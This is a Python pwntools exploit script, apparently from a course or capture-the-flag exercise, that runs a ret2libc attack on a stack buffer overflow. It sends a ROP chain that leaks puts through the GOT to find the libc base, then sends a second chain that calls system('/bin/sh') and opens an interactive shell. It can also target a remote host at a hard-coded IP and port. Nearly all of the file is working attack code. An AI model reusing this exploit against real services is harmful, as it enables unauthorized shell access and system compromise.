from pwn import *

###################
### CONNECTION ####
###################
LOCAL = True
REMOTETCP = False
GDB = True
USE_ONE_GADGET = False

LOCAL_BIN = "../../source/ret2libc/ret2libc"
LIBC = "/lib/x86_64-linux-gnu/libc.so.6"

libc_elf = ELF(LIBC)

if LOCAL:
    proc = process(LOCAL_BIN)
    elf = ELF(LOCAL_BIN)
    ROP_LOADED = ROP(elf)
elif REMOTETCP:
    proc = remote("140.113.24.241", 30173)
    elf = ELF(LOCAL_BIN)
    ROP_LOADED = ROP(elf)

if GDB and LOCAL:
    context.terminal = ['tmux', 'splitw', '-h']
    gdb.attach(proc)

###################
###   PAYLOAD  ####
###################

# 0x000000000040115d: pop rbp; ret;
# 0x00007ffff7db33e5: pop rdi; ret;
# pop_rbp = 0x000000000040115d 

RET = 0x40115e
# POP_RDI = 0x00007ffff7db33e5
POP_RDI = 0x00007feb4facd3e5
PUTS_GOT = elf.got["puts"]
PUTS_PLT = elf.plt["puts"]
MAIN_SYM = elf.symbols["main"]

log.info("puts got @ " + hex(PUTS_GOT))
log.info("puts plt @ " + hex(PUTS_PLT))
log.info("main sym @ " + hex(MAIN_SYM))

payload = b"".join([
    b"X" * (128 + 8),
    p64(POP_RDI),
    p64(PUTS_GOT),
    p64(PUTS_PLT),
    p64(MAIN_SYM),
])

print(proc.recvuntil(b"Welcome to the server!\n").decode())
proc.send(payload)
recv = proc.recvline().strip()
leak = unpack(recv, 'all', endian='big')
log.info(leak)
libc_elf.address = leak - libc_elf.symbols["puts"]
log.info(leak)
log.info(libc_elf.symbols["puts"])
log.info("libc   @ " + hex(libc_elf.address))

PARAM_ADDR = next(libc_elf.search(b"/bin/sh\x00"))
SYSTEM_ADDR = libc_elf.symbols["system"]
EXIT_ADDR = libc_elf.symbols["exit"]

log.info("/bin/sh @ " + hex(PARAM_ADDR))
log.info("system  @ " + hex(SYSTEM_ADDR))
log.info("exit    @ " + hex(EXIT_ADDR))

payload = b"".join([
    b"X" * (128 + 8),
    p64(POP_RDI),
    p64(PARAM_ADDR),
    p64(SYSTEM_ADDR),
    p64(EXIT_ADDR),
])

proc.clean()
proc.sendline(payload)
proc.interactive()

# payload = b''
# payload += b'X' * (128 + 8)
# payload += pwnlib.util.packing.p64(ret)
# payload += pwnlib.util.packing.p64(pop_rdi)
# payload += pwnlib.util.packing.p64(next(libc_elf.search(b'/bin/sh\x00')))
# payload += pwnlib.util.packing.p64(libc_elf.symbols.system)
